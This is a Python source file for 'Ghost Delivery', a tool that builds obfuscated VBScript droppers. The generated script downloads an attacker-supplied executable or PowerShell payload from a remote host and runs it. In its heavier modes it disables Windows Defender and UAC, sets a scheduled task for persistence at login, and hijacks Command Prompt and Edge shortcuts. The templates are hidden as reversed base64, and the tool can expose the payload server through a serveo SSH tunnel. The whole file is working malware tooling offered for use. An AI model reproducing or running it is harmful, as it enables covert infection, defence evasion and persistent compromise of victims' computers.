import random, sys, string, os, time, base64
#Coded by s1ege
#Greetz to all GSH members
#Use for educational purposes, blah blah

def main():
	clear()
	print("""    
			   	#GSH
			 ~G h o s t  D e l i v e r y~
	Tool designed to create a obfuscated .vbs script with three options:
	Heavy:  *Downloads payload to TEMP directory and executes payload
		*Disables Defender
		*Disables UAC
		*Injects/creates Command Prompt and Microsoft Edge
		shortcuts with payload path
		*Adds scheduled task for payload to be run at login
		*Obfuscates the vbs script
	Medium: *Downloads payload to TEMP directory and executes payload
		*Adds scheduled task for payload to be run at login
		*Injects/creates Command Prompt and Microsoft Edge
		shortcuts with payload path
		*Disables UAC
		*Obfuscates the vbs script
	Light:  *Downloads payload to TEMP directory and executes payload
		*Adds scheduled task for payload to be run at login
		*Injects/creates Command Prompt and Microsoft Edge
		shortcuts with payload path
		*Obfuscates the vbs script
	This tool also has a serveo function to deliver obfuscated vbs script
		""")
	heavy = {'heavy','h'}
	light = {'light','l'}
	medium = {'medium', 'm'}
	pwsh = {'powershell','ps1','.ps1', 'pwsh', 'p'}
	exe = {'executable','exe','.exe', 'e'}
	yes = {'yes','y','ye',''}
	no = {'no','n','exit'}
	scripts = {
		"exe_heavy": "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",
		"exe_medium": "=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",
		"exe_light": "==wJmlGIk5WRnACLnUmdhNnLr5GbnACLnIyOlhXZuQWYvxWehB3Lu8SJQ1URUVCI7oTZnRWZtQnZvN3byNWatBCdyFGdzBCZuFWbt92YtAiblRGZphGIlxWe0N3dvRmbpdXLgUGel5CbsVGazJXZ39Gcg4USN9CIUJVQUNFIj9iIg0DIzRnbl1WdnJXQusmbsdCIsciIlhXZuQWbjxlMz0WZ0NXeTx1c39GZul2VcpzQiASPggGdhBHdldmchRnLr5GbnACLnkiIL5ETuU2ZkVEI0Z2bz9mcjlWTcJCImASKiA3b0t2clRmIoMnclRGbvZEbhl2YlB3UuM2c3hCd1NGdy9GaTVGdhVmcD5yYzdHI9AyauxGI0V2UnACLnUmdhNnLr5GbnACLnISZ4VmLkF2bslXYw9iLvUCUNVEVlAyOk12YgM3clN2byBVL0JXY0NFIk5WYt12bD1CIuVGZklGagUGb5R3c39GZul2dtACbsVGazJXZ39Gcg4USN9CIUJVQUNFIj9iIg0DIzRnbl1WdnJXQusmbsdCIsciIlhXZuQWbjxlMz0WZ0NXeTx1c39GZul2VcpzQiASPggGdhBHdldmchRnLr5GbnACLnkiIL5ETuQWbjxlIgYCIpICcvR3azVGZigycyVGZs9mRsFWajVGcT5yYzdHK0V3Y0J3boNVZ0FWZyNkLjN3dg0DIr5GbgQXZTdCIscSKiIiIlhXZuQWYvxWehB3LlAVTFRVJiICIyR3LgY0Lg0WZ0NXezBSdy9CI0NXZodWaoBCby9CIO90RPxkTPByYz9CIyVGZuVmZlR0c39GZul2Vg4GdvASZ0FWZyN0LgM3azFGdoN2UgsTZ4VmLkF2bslXYw9iLvUCUNVEVlAyO9BSZ4VmLkF2bslXYw9SJQ1URUVCIlxWaGRXdP1CIlhXZuQWYvxWehB3LzNXZyRGZh9yL6AHd0hGIydXagsHImACZuFWbt92YtAiblRGZphGIlxWe0N3dvRmbpdXLgwGblh2cyV2dvBnIoMWZ4VmLjN3dnACLnkiIsxWZoNnL0BXayN2cXJCK0NWZqJ2TlRXYlJ3Qg0DIjN3dgQXZTdCIscSZzxWRnACLnEDIsIych5WdyJCIsIiIgwiIjFWdgICImASK0MDKyh2QgYCIl1WYOxGb1ZEdwlmcjNlL0BXayN2UXBCIgACIgcCIscyXgYCIpQzMoIHaDBCLiUGel5CdwlmcjN3diASZ0V3YlhXRsxWZoNlLsxWZoNlai9GIgACInACLnkiIu9Wa0F2YpxGcwFkLsxWZoNlIoQ3YlpmYPVGdhVmcDBSPgwGblh2UqJ2bgQXZTBCIgcCIsciblhGVgADI9ACa0dmblxmLzRnbl1WdnJXQuQHcpJ3YTdFIml0J",
		"pwsh_heavy": "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",
		"pwsh_medium": "=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",
		"pwsh_light": "==wJmlGIk5WRnACLnUmdhNnLr5GbnACLnIyOlhXZuQWYvxWehB3Lu8SJQ1URUVCI7oTZnRWZtQnZvN3byNWatBCdyFGdzBCZuFWbt92YtAiblRGZphGIlxWe0N3dvRmbpdXLgUGel5CbsVGazJXZ39Gcg4USN9CIUJVQUNFIj9iIg0DIzRnbl1WdnJXQusmbsdCIsciIlhXZuQWbjxlMz0WZ0NXeTx1c39GZul2VcpzQiASPggGdhBHdldmchRnLr5GbnACLnkiIL5ETuU2ZkVEI0Z2bz9mcjlWTcJCImASKiA3b0t2clRmIoMnclRGbvZEbhl2YlB3UuM2c3hCd1NGdy9GaTVGdhVmcD5yYzdHI9AyauxGI0V2UnACLnUmdhNnLr5GbnACLnISZ4VmLkF2bslXYw9iLvUCUNVEVlAyOk12YgM3clN2byBVL0JXY0NFIk5WYt12bD1CIuVGZklGagUGb5R3c39GZul2dtACbsVGazJXZ39Gcg4USN9CIUJVQUNFIj9iIg0DIzRnbl1WdnJXQusmbsdCIsciIlhXZuQWbjxlMz0WZ0NXeTx1c39GZul2VcpzQiASPggGdhBHdldmchRnLr5GbnACLnkiIL5ETuQWbjxlIgYCIpICcvR3azVGZigycyVGZs9mRsFWajVGcT5yYzdHK0V3Y0J3boNVZ0FWZyNkLjN3dg0DIr5GbgQXZTdCIscSKiIiIlhXZuQWYvxWehB3LlAVTFRVJiICIyR3LgY0Lg0WZ0NXezBSdy9CI0NXZodWaoBCby9CIO90RPxkTPByYz9CIyVGZuVmZlR0c39GZul2Vg4GdvASZ0FWZyN0LgM3azFGdoN2UgsTZ4VmLkF2bslXYw9iLvUCUNVEVlAyO9BSZ4VmLkF2bslXYw9SJQ1URUVCIlxWaGRXdP1CIlhXZuQWYvxWehB3LzNXZyRGZh9yL6AHd0hGIydXagsHImACZuFWbt92YtAiblRGZphGIlxWe0N3dvRmbpdXLgwGblh2cyV2dvBnIoMWZ4VmLjN3dnACLnkiIsxWZoNnL0BXayN2cXJCK0NWZqJ2TlRXYlJ3Qg0DIjN3dgQXZTdCIscSZzxWRnACLnEDIsIych5WdyJCIsIiIgwiIjFWdgICImASK0MDKyh2QgYCIl1WYOxGb1ZEdwlmcjNlL0BXayN2UXBCIgACIgcCIscyXgYCIpQzMoIHaDBCLiUGel5CdwlmcjN3diASZ0V3YlhXRsxWZoNlLsxWZoNlai9GIgACInACLnkiIu9Wa0F2YpxGcwFkLsxWZoNlIoQ3YlpmYPVGdhVmcDBSPgwGblh2UqJ2bgQXZTBCIgcCIsciblhGVgADI9ACa0dmblxmLzRnbl1WdnJXQuQHcpJ3YTdFIml0J"
	}
	check_ext = raw_input("Is your payload a powershell script or executable? enter 'ps1' or 'exe': ").lower()
	check_opt = raw_input("\nDo you want a light, medium or heavy script?: ").lower()
	if check_ext in exe:
		if check_opt in heavy:
			script = scripts["exe_heavy"]
		elif check_opt in medium:
			script = scripts["exe_medium"]
		elif check_opt in light:
			script = scripts["exe_light"]
	elif check_ext in pwsh:
		if check_opt in heavy:
			script = scripts["pwsh_heavy"]
		elif check_opt in medium:
			script = scripts["pwsh_medium"]
		elif check_opt in light:
			script = scripts["pwsh_light"]
	else:
		print("Invalid option")
	lstring = base64.b64decode(script[::-1])
	lines = lstring[1:-1].split("', '")
	ip = raw_input("\nEnter server IP address hosting your payload (Example: facebook.serveo.net): ")
	lines = [content.replace('address', ip) for content in lines]
	payload = raw_input("\nEnter name of payload to be delivered (Example: payload.exe): ")
	lines = [content.replace('payload.exe', payload) for content in lines]
	outfile = open("t", "w")
	with open("t", "w") as file:
		for line in lines:
			file.write(line + "\n")
		file.close()
	D=str(chr(42))
	def randCapitalization(characters):
		G=""
		for b in characters:
			r=random.randrange(0,2)
			if r==0:
				G+=b.upper()
			if r==1:
				G+=b.lower()
		return G
	H=random.randrange(5,60)
	X=''.join(random.choice(string.ascii_uppercase+string.ascii_lowercase)for _ in range(H))
	w=''.join(random.choice(string.ascii_uppercase+string.ascii_lowercase)for _ in range(H))
	y=''.join(random.choice(string.ascii_uppercase+string.ascii_lowercase)for _ in range(H))
	x=''.join(random.choice(string.ascii_uppercase+string.ascii_lowercase)for _ in range(H))
	s=''.join(random.choice(string.ascii_uppercase+string.ascii_lowercase)for _ in range(H))
	L=''.join(random.choice(string.ascii_uppercase+string.ascii_lowercase)for _ in range(H))

	def obfu(body):
		A=""
		for i in range(0,len(body)):
			if A=="":
				A+=expr(ord(body[i]))
			else:
				A+="*"+expr(ord(body[i]))
		return A

	def expr(char):
		range=random.randrange(100,10001)
		N=random.randrange(0,3)
		if N==0:
			print "Char "+str(char)+" -> "+str((range+char))+"-"+str(range)
			return str((range+char))+"-"+str(range)
		if N==1:
			print "Char "+str(char)+" -> "+str((char-range))+"+"+str(range)
			return str((char-range))+"+"+str(range)
		if N==2:
			print "Char "+str(char)+" -> "+str((char*range))+"/"+str(range)
			return str((char*range))+"/"+str(range)

	j=open("t","r")
	obfs=open("obfs.vbs","w")
	obfs.write(randCapitalization("Dim "+X+", "+w+", "+y)+"\n")
	obfs.write(randCapitalization("Sub "+s)+"\n")
	obfs.write(randCapitalization(X+" = ")+chr(34)+obfu(j.read())+chr(34)+"\n")
	obfs.write(randCapitalization(w+" = Split("+X+", chr(eval(")+obfu(D)+")))\n")
	obfs.write(randCapitalization("for each "+x+" in "+w)+"\n")
	obfs.write(randCapitalization(y+" = "+y+" & chr(eval("+x)+"))\n")
	obfs.write(randCapitalization("next")+"\n")
	obfs.write(randCapitalization(L)+"\n")
	obfs.write(randCapitalization("End Sub")+"\n")
	obfs.write(randCapitalization("Sub "+L)+"\n")
	obfs.write(randCapitalization("eval(execute("+y)+"))\n")
	obfs.write(randCapitalization("End Sub")+"\n")
	obfs.write(randCapitalization(s)+"\n")
	j.close()
	obfs.close()
	os.remove('t')
	clear()
	input = raw_input('Delivery script obfuscated and saved as "obfs.vbs"\n\nWould you like to start a serveo server to forward port 80 for payload delivery? yes/no: ').lower()
	if input in yes:
		domain = raw_input('\nEnter subdomain name for serveo server: ')
		time.sleep(2)
		os.system('ssh -o ServerAliveInterval=60 -R'+domain+'.serveo.net:80:localhost:80 serveo.net')
	elif input in no:
		sys.exit()
	else:
		print("Choose yes or no")
		serveo()

def clear():
	if os.name == "nt": 
		os.system('cls')
	else: 
		os.system('clear')

if __name__== "__main__":
	main()
